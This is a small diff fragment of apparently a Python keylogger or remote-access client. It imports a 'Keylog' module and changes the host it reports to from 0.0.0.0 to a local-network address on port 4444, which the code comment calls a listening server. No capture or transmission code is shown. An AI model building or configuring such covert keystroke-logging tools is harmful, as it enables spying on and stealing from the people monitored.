@@ -18,8 +18,8 @@ import Keylog
 from tkinter import *
 import signal
 
-HOST = "0.0.0.0"
-PORT = 4444
+HOST = '192.168.1.3'
+PORT = 4444 #Server Port is listening
 img_bytes = b'\x00\x01\x02...'
 
 FONT = ("Arial", 20, "bold")
